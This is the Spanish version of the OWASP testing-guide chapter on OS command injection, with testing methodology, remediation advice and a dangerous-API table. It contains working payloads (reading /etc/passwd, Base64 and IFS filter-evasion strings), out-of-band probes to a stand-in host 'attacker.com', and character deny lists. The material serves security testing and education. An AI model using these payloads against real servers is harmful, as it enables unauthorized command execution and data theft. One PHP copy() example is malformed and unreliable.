# Inyección de comandos

|ID          |
|------------|
|WSTG-INJT-12|

## Resumen

Este artículo describe cómo probar una aplicación para detectar inyección de comandos del sistema operativo. El evaluador intentará inyectar un comando del sistema operativo a través de una solicitud HTTP a la aplicación.

La inyección de comandos del sistema operativo es una vulnerabilidad que se produce cuando la entrada del usuario se pasa directamente a un comando del sistema operativo sin validarla ni sanearla adecuadamente. Esto permite que el usuario inyecte y ejecute comandos arbitrarios en el servidor, lo que puede provocar acceso no autorizado a los datos, corrupción de datos y el compromiso total del servidor. Esta vulnerabilidad se puede prevenir si se prioriza la seguridad durante el diseño y el desarrollo de las aplicaciones.

## Objetivos de la prueba

- Identificar y evaluar los puntos de inyección de comandos.
- Eludir los filtros de caracteres especiales y comandos del sistema operativo.

## Cómo probar

Al ver un archivo en una aplicación web, el nombre del archivo suele aparecer en la URL. Perl permite canalizar datos desde un proceso a una instrucción `open`. El usuario puede añadir simplemente el símbolo de canalización `|` al final del nombre del archivo.

URL de ejemplo antes de la modificación:

`https://sensitive/cgi-bin/userData.pl?doc=user1.txt`

URL de ejemplo modificada:

`https://sensitive/cgi-bin/userData.pl?doc=user1.txt|/bin/ls`

Esto ejecutará el comando `/bin/ls`.

Si se añade un punto y coma al final de la URL de una página .PHP, seguido de un comando del sistema operativo, se ejecutará ese comando. `%3B` está codificado en URL y se decodifica como punto y coma.

Ejemplo:

`https://sensitive/something.php?dir=%3Bcat%20/etc/passwd`

### Ejemplo

Considere el caso de una aplicación que contiene un conjunto de documentos que se pueden consultar desde Internet. Si inicia un proxy personal (como ZAP o Burp Suite), puede obtener una solicitud HTTP POST como la siguiente (`https://www.example.com/public/doc`):

```txt
POST /public/doc HTTP/1.1
Host: www.example.com
[...]
Referer: https://127.0.0.1/WebGoat/attack?Screen=20
Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
Content-Type: application/x-www-form-urlencoded
Content-length: 33

Doc=Doc1.pdf
```

En esta solicitud POST, observamos cómo la aplicación recupera la documentación pública. Ahora podemos probar si es posible añadir un comando del sistema operativo para inyectarlo en la solicitud HTTP POST. Pruebe lo siguiente (`https://www.example.com/public/doc`):

```txt
POST /public/doc HTTP/1.1
Host: www.example.com
[...]
Referer: https://127.0.0.1/WebGoat/attack?Screen=20
Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
Content-Type: application/x-www-form-urlencoded
Content-length: 33

Doc=Doc1.pdf+|+Dir c:\
```

Si la aplicación no valida la solicitud, podemos obtener el siguiente resultado:

```txt
    Exec Results for 'cmd.exe /c type "C:\httpd\public\doc\"Doc=Doc1.pdf+|+Dir c:\'
    Output...
    Il volume nell'unità C non ha etichetta.
    Numero di serie Del volume: 8E3F-4B61
    Directory of c:\
     18/10/2006 00:27 2,675 Dir_Prog.txt
     18/10/2006 00:28 3,887 Dir_ProgFile.txt
     16/11/2006 10:43
        Doc
        11/11/2006 17:25
           Documents and Settings
           25/10/2006 03:11
              I386
              14/11/2006 18:51
             h4ck3r
             30/09/2005 21:40 25,934
            OWASP1.JPG
            03/11/2006 18:29
                Prog
                18/11/2006 11:20
                    Program Files
                    16/11/2006 21:12
                        Software
                        24/10/2006 18:25
                            Setup
                            24/10/2006 23:37
                                Technologies
                                18/11/2006 11:14
                                3 File 32,496 byte
                                13 Directory 6,921,269,248 byte disponibili
                                Return code: 0
```

En este caso, hemos realizado correctamente un ataque de inyección de comandos del sistema operativo.

## Caracteres especiales para la inyección de comandos

Se usan caracteres especiales para encadenar varios comandos.
Estos caracteres varían según el sistema operativo que se ejecute en el servidor web.
Por ejemplo, los siguientes tipos de encadenamiento de comandos se pueden usar tanto en sistemas Windows como en sistemas basados en Unix:

- `cmd1|cmd2` : cmd2 se ejecutará tanto si cmd1 tiene éxito como si no.
- `cmd1||cmd2` : cmd2 solo se ejecutará si cmd1 falla.
- `cmd1&&cmd2` : cmd2 solo se ejecutará si cmd1 tiene éxito.
- `cmd1&cmd2` : cmd2 se ejecutará tanto si cmd1 tiene éxito como si no.

El punto y coma `;` funciona en sistemas basados en Unix y en PowerShell. Sin embargo, no funciona en el símbolo del sistema de Windows (CMD).
Además, se puede usar la sustitución de comandos de Bash `$(cmd)` o &grave;`cmd`&grave; para ejecutar comandos en sistemas basados en Unix.
También se pueden usar descriptores de archivo de Linux como `>(cmd)` y `<(cmd)`.

## Técnicas adicionales de inyección de comandos

Los atacantes pueden aprovechar distintas técnicas para ejecutar comandos del sistema operativo, según el entorno y los mecanismos de filtrado.

### Sustitución de comandos

La sustitución de comandos permite usar la salida de un comando como entrada de otro.

Ejemplos:

```bash
$(whoami)
`whoami`
```

### Encadenamiento de comandos

Se pueden ejecutar varios comandos secuencialmente mediante operadores de encadenamiento de comandos.

Ejemplos:

```bash
cmd1 ; cmd2
cmd1 && cmd2
cmd1 || cmd2
```

### Redirección de archivos

Los atacantes pueden redirigir la salida de un comando a archivos accesibles para el servidor web.

Ejemplo:

```bash
whoami > /var/www/html/output.txt
```

### Inyección de comandos fuera de banda

Los atacantes pueden usar servicios externos para detectar la ejecución de comandos.

Ejemplos:

```bash
curl http://attacker.com
nslookup attacker.com
```

## Evasión de filtros

Para prevenir la inyección de comandos del sistema operativo, los desarrolladores web suelen usar filtros. Sin embargo, estos filtros a veces no se implementan correctamente, lo que permite a los atacantes eludirlos.
En esta sección se describen distintas técnicas para eludir esos filtros.

### Metodología

En primer lugar, siempre es recomendable tener una comprensión básica del funcionamiento del filtro antes de intentar eludirlo.
A continuación se presenta una metodología que se puede usar cuando se encuentra un filtro:

- ¿El filtro se aplica en el cliente o en el servidor?
- ¿El filtro se aplica a caracteres especiales, a comandos del sistema operativo o a ambos?
- ¿La aplicación web usa un filtro de lista de permitidos o de lista de bloqueados?
- ¿Qué sistema operativo se ejecuta en el servidor web? Esto permite hacerse una idea de los comandos y caracteres especiales que se pueden usar.

### Evasión de filtros de caracteres especiales

Como se mencionó anteriormente, los filtros pueden aplicarse a caracteres especiales, a comandos del sistema operativo o a ambos.
Para eludir los filtros aplicados a caracteres especiales, podemos usar variables de entorno, expansión de llaves de Bash o codificación URL.

#### Codificación URL

La codificación URL de los caracteres especiales puede permitirnos eludir el filtro si el servidor web solo bloquea los caracteres especiales en texto sin formato.
A continuación se muestran algunos caracteres especiales y su formato codificado en URL:

|Carácter especial|Codificación URL|
|-----------------|------------|
|;                | %3b        |
|espacio          | %20        |
|tabulación       | %09        |
|&                | %26        |
|Nueva línea      | %0a        |

Por ejemplo, en lugar de usar `;whoami`, podríamos usar `%3bwhoami`.

#### Variables de entorno

El servidor web suele filtrar caracteres especiales como el espacio, el punto y coma, la tabulación o la nueva línea, especialmente si no son útiles para la entrada especificada.
Para eludir esta restricción, podemos usar variables de entorno como **IFS**, **PATH** o **LS_COLORS** en Linux, y **HOMEPATH** en Windows.
Por ejemplo, en Linux, se pueden reemplazar `/`, `;` y `[space]`, respectivamente, por `${PATH:0:1}`, `${LS_COLORS:10:1}` y `${IFS}`.
En Windows CMD, podemos reemplazar `\` por `%HOMEPATH:~6,1%` o usar `$env:HOMEPATH[0]` en PowerShell.

#### Expansión de llaves de Bash

La expansión de llaves de Bash es una función de Bash que permite ejecutar comandos mediante llaves.
Por ejemplo, `{ls,-la}` ejecutará el comando `ls -la`. Esto puede resultar muy útil si el servidor web filtra los caracteres de espacio, nueva línea o tabulación.
Supongamos que queremos mostrar el contenido del archivo '/etc/passwd'. En lugar de usar `;cat /etc/passwd`, podemos usar `;{cat,/etc/passwd}`.
Dicho esto, es importante tener en cuenta que esta técnica solo funciona si el servidor web usa Bash y no filtra caracteres como `}{/,;`.

### Evasión de filtros de comandos

En esta sección, exploraremos algunas técnicas para eludir los filtros aplicados a los comandos del sistema operativo.

#### Modificación de mayúsculas y minúsculas

La modificación de mayúsculas y minúsculas es una técnica que se usa para eludir los filtros de comandos del sistema operativo. Es útil si el filtro del lado del servidor distingue entre mayúsculas y minúsculas.
Por ejemplo, si durante las pruebas observamos que el servidor web bloquea `;whoami`, podemos probar `;WhoAmi`. Si vemos que el filtro del lado del servidor solo bloquea los comandos en minúsculas, podremos eludirlo.
Esta técnica suele funcionar en sistemas Windows.
En Linux, usaremos una técnica llamada **desplazamiento de caracteres**. Por ejemplo, el siguiente comando convierte cada carácter en mayúscula a su correspondiente carácter en minúscula.

```bash
;$(tr "[A-Z]" "[a-z]"<<<"WhoaMi")
```

#### Inserción de caracteres

Se pueden insertar caracteres como `\`; `$@`, `'` en los comandos del sistema operativo Linux sin afectar a su ejecución normal.
Por ejemplo, `who\ami`, `w$@hoami` o `wh'o'ami` ejecutarán el comando `whoami`.

> Nota: el número de comillas simples `'` del comando Linux debe ser **par**; de lo contrario, se producirá un error. Si usa Windows CMD, asegúrese de usar comillas dobles `"` en su lugar.
Además, también se puede usar un acento circunflejo `^` en los comandos de CMD. Por ejemplo, `whoa^mi` ejecutará el comando `whoami`. Esto no funciona en PowerShell.

#### Codificación Base64

En determinados escenarios, el servidor web puede filtrar comandos como `whoami`, `id`, etc.
Supongamos que el servidor web bloquea `whoami`. Por tanto, no podemos usar una carga útil como `;whoami`.
Para eludir esta restricción, usaremos la versión codificada en Base64 de `whoami` ejecutando: `echo -n 'whoami' | base64`. Esto devolverá `d2hvYW1p`.
A continuación, enviaremos la siguiente carga útil: `;bash<<<$(base64 -d<<< d2hvYW1p)` en el parámetro vulnerable. Esto debería eludir el filtro del lado del servidor y permitirnos lograr la ejecución remota de comandos.

**Por último, tenga en cuenta que quizá deba combinar distintas técnicas de evasión de filtros de caracteres especiales y comandos del sistema operativo para eludir correctamente los filtros implementados por el servidor web.**

## Inyección de comandos ciega

A veces, no podemos ver la salida del comando inyectado en la respuesta HTTP del servidor web. Por ello, tendremos que encontrar la manera de confirmar si la inyección se realizó correctamente. Para hacerlo, podemos usar servidores remotos `HTTP`, `DNS` o `SMTP` bajo nuestro control.
También podemos usar **comandos del sistema que introducen demoras** como `sleep` (Linux), `timeout` (Windows) o utilidades de red como `ping`.
Por ejemplo, podemos ejecutar `;sleep(5)` y, si el servidor web espera 5 segundos antes de enviarnos una respuesta, podemos confirmar que es vulnerable a la inyección de comandos ciega.
Además, también podemos **redirigir la salida del comando inyectado al directorio raíz web del servidor web**. `;whoami>/var/www/html/poc.txt;`
A continuación, podemos ejecutar `curl http://website.com/poc.txt`. Si podemos recuperar el archivo, podremos confirmar que el servidor web es vulnerable a la inyección de comandos ciega.

## API peligrosas para la ejecución de comandos

Las siguientes API, en distintos lenguajes de programación, pueden ejecutar comandos del sistema operativo y provocar vulnerabilidades de inyección de comandos si se usan con entradas de usuario sin sanear.

| Lenguaje | API peligrosas |
|---------|---------------|
| Java | `Runtime.exec()` |
| C/C++ | `system()`, `exec()`, `ShellExecute()` |
| Python | `exec()`, `eval()`, `os.system()`, `os.popen()`, `subprocess.Popen()`, `subprocess.call()` |
| PHP | `system()`, `shell_exec()`, `exec()`, `proc_open()`, `eval()`, `passthru()` |
| Node.js | `child_process.exec()`, `execSync()`, `spawn()` |
| Ruby | `system()`, `exec()`, `Open3.popen3()` |
| Go | `exec.Command()` |
| C# | `Process.Start()` |

## Remediación

### Saneamiento

Los parámetros de consulta de la URL y los datos de los formularios deben validarse y sanearse para prevenir la inyección de caracteres maliciosos.
Una lista de bloqueados es una opción, pero puede ser difícil tener en cuenta todos los caracteres que se deben validar. Además, puede haber caracteres que aún no se hayan descubierto.
Se debe crear una lista de permitidos que contenga solo caracteres o comandos autorizados para validar la entrada del usuario. Esta lista debe eliminar tanto los caracteres que se hayan pasado por alto como las amenazas aún no descubiertas.

Una lista general de denegación para la inyección de comandos puede incluir `|` `;` `&` `$` `>` `<` `'` `\` `!` `>>` `#`

Escapar o filtrar los caracteres especiales para Windows: `(` `)` `<` `>` `&` `*` `‘` `|` `=` `?` `;` `[` `]` `^` `~` `!` `.` `"` `%` `@` `/` `\` `:` `+` `,`  ``` ` ```

Escapar o filtrar los caracteres especiales para Linux: `{` `}` `(` `)` `>` `<` `&` `*` `‘` `|` `=` `?` `;` `[` `]` `$` `-` `#` `~` `!` `.` `"` `%`  `/` `\` `:` `+` `,` ``` ` ```

Además, evite usar funciones que ejecuten comandos del sistema operativo en su aplicación, salvo que sea absolutamente necesario. Por ejemplo, en lugar de usar `system("cp /path/to/file1.txt /path/to/file2.txt")` para copiar un archivo, puede usar directamente la función integrada de PHP `copy("cp /path/to/file1.txt, /path/to/file2.txt")`, que hace exactamente lo mismo. Cabe señalar que otros lenguajes y marcos de desarrollo suelen ofrecer funciones integradas similares.

### Permisos

La aplicación web y sus componentes deben ejecutarse con permisos estrictos que no permitan la ejecución de comandos del sistema operativo. Intente verificar toda esta información para realizar pruebas desde un punto de vista de caja gris.

## Herramientas

- OWASP [WebGoat](https://owasp.org/www-project-webgoat/)
- [Commix](https://github.com/commixproject/commix)
- [Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)
- [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)

## Referencias

- [CWE-78: Neutralización incorrecta de elementos especiales usados en un comando del sistema operativo («inyección de comandos del sistema operativo»)](https://cwe.mitre.org/data/definitions/78.html)
- [ENV33-C. No llamar a system()](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177)